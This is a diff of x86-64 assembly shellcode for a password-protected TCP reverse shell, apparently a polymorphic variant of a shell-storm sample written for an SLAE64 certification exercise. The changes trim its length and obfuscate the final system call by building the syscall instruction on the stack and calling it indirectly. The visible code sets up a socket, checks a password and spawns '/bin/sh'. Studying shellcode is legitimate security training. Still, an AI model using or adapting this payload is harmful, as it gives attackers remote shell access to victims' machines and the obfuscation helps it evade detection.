@@ -1,3 +1,9 @@
+;original shellcode : http://shell-storm.org/shellcode/files/shellcode-871.php
+;Reverse_shell_TCP with password
+;modified by Sathish Kumar L SLAE64 - 1408
+;original lenght = 138 bytes
+;modified length = 135 bytes
+
 global _start
 
 _start:
@@ -5,7 +11,6 @@ _start:
     xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
 	xor rsi, rsi 
 	mul rsi
-	add rcx, 0x3       
 	push byte 0x2   ;pusing argument to the stack
 	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
 	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
@@ -67,6 +72,11 @@ password_check:
 	
 execve:                                      
     xor esi, esi
+    xor r15, r15
+    mov r15w, 0x161f
+    sub r15w, 0x1110
+    push r15
+    mov r15, rsp
     mov rdi, 0xff978cd091969dd0
     inc rdi
     neg rdi
@@ -75,5 +85,5 @@ execve:
     push rdi
     push rsp
     pop rdi
-    syscall
+    call r15
 
